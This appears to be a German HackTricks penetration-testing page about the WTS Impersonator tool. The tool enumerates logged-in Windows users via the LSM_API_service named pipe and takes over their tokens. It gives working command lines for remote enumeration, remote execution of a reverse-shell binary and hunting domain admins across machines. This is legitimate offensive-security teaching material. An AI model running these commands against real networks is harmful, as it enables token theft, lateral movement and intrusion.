{{#include ../../banners/hacktricks-training.md}}

Das **WTS Impersonator**-Tool nutzt die **"\\pipe\LSM_API_service"** RPC Named Pipe, um heimlich angemeldete Benutzer zu enumerieren und ihre Tokens zu übernehmen, wodurch traditionelle Token-Impersonationstechniken umgangen werden. Dieser Ansatz ermöglicht nahtlose laterale Bewegungen innerhalb von Netzwerken. Die Innovation hinter dieser Technik wird **Omri Baso** zugeschrieben, dessen Arbeit auf [GitHub](https://github.com/OmriBaso/WTSImpersonator) zugänglich ist.

### Kernfunktionalität

Das Tool funktioniert durch eine Abfolge von API-Aufrufen:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Schlüsselmodule und Verwendung

- **Benutzerenumeration**: Lokale und remote Benutzerenumeration ist mit dem Tool möglich, indem Befehle für beide Szenarien verwendet werden:

- Lokal:
```bash
.\WTSImpersonator.exe -m enum
```
- Remote, indem eine IP-Adresse oder ein Hostname angegeben wird:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Befehle ausführen**: Die Module `exec` und `exec-remote` benötigen einen **Service**-Kontext, um zu funktionieren. Die lokale Ausführung benötigt einfach die WTSImpersonator-Executable und einen Befehl:

- Beispiel für die lokale Befehlsausführung:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kann verwendet werden, um einen Service-Kontext zu erhalten:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote-Befehlsausführung**: Beinhaltet das Erstellen und Installieren eines Services remote, ähnlich wie PsExec.exe, was die Ausführung mit den entsprechenden Berechtigungen ermöglicht.

- Beispiel für die remote Ausführung:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Benutzerjagdmodul**: Zielt auf spezifische Benutzer über mehrere Maschinen ab und führt Code unter ihren Anmeldeinformationen aus. Dies ist besonders nützlich, um Domain-Admins mit lokalen Administratorrechten auf mehreren Systemen anzuvisieren.
- Verwendung Beispiel:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
